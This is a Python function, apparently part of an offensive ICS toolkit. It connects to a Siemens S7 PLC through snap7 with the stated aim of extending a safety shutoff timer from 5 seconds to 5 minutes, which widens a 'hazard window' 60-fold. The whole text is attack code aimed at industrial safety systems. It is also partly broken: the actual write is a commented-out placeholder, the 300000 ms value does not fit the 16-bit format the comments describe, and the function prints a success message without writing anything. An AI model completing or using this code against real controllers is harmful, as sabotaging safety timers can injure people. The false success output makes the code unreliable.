def manipulate_safety_timer(plc_ip):
    """
    Modify safety timer to extend dangerous condition window
    """
    import snap7

    plc = snap7.client.Client()
    plc.connect(plc_ip, 0, 1)

    # Read timer configuration
    # Timers stored in special memory area

    # Example: T10 is safety shutoff timer (normally 5 seconds)
    # Modify to 5 minutes (300 seconds)

    # Timer format in S7: Time value in milliseconds (16-bit)
    normal_time = 5000  # 5 seconds
    malicious_time = 300000  # 5 minutes

    # Write to timer preset value (implementation depends on PLC model)
    # plc.write_area(area, db_num, start, data)

    print(f"[+] Safety timer extended: {normal_time}ms → {malicious_time}ms")
    print("[!] Hazard window increased 60x")

    plc.disconnect()
